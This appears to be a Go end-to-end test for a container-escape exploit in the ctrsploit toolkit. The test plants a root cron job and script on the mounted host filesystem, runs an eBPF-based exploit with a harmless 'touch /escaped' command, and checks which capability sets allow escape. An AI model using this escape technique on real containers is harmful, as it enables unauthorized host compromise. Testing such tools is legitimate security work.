package bash

import (
	"fmt"
	"os"
	"testing"
	"time"

	"github.com/ctrsploit/ctrsploit/pkg/fileutil"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestE2E_Exploit(t *testing.T) {
	tests := map[string]struct {
		loadable    bool
		exploitable bool
	}{
		"CAP_SYS_ADMIN": {
			loadable:    true,
			exploitable: true,
		},
		"CAP_BPF+CAP_PERFMON": {
			loadable:    false,
			exploitable: false,
		},
	}
	testEnv := os.Getenv("TEST_ENV")
	test, ok := tests[testEnv]
	if !ok {
		t.Skipf("Skipping test for unsupported environment: %s", testEnv)
	}
	t.Run(fmt.Sprintf("%s", testEnv), func(t *testing.T) {
		// prepare: create crontab to trigger ebpf exploit
		err := os.WriteFile("/host/etc/cron.d/trigger", []byte("* * * * * root /1.sh\n"), 0644)
		require.NoError(t, err, "Failed to write cron job file")
		err = os.WriteFile("/host/1.sh", []byte("#!/bin/bash\ntouch /not-escaped"), 0755)
		require.NoError(t, err, "Failed to write script file")
		// Exploit
		ec := make(chan error, 1)
		go func() {
			ec <- Exploit("touch /escaped")
		}()
		// check
		const timeout = 3 * time.Minute
		const pollInterval = 500 * time.Millisecond

		escaped := func() bool {
			exists, _ := fileutil.CheckPathExists("/host/escaped")
			return exists
		}
		notEscaped := func() bool {
			exists, _ := fileutil.CheckPathExists("/host/not-escaped")
			return exists
		}

		if test.exploitable {
			assert.Eventually(t, escaped, timeout, pollInterval, "Exploit failed to create the file within the timeout period.")
		} else {
			assert.Eventually(t, notEscaped, timeout, pollInterval, "not-escaped is not created, but the environment was expected to be not exploitable.")
		}
		select {
		case err = <-ec:
		case <-time.After(time.Second):
			err = nil
		}
		if test.loadable {
			require.NoError(t, err, "Exploit function returned an error but was expected to succeed.")
		} else {
			require.Error(t, err, "Exploit function did not return an error but was expected to fail (not loadable).")
		}
	})
}
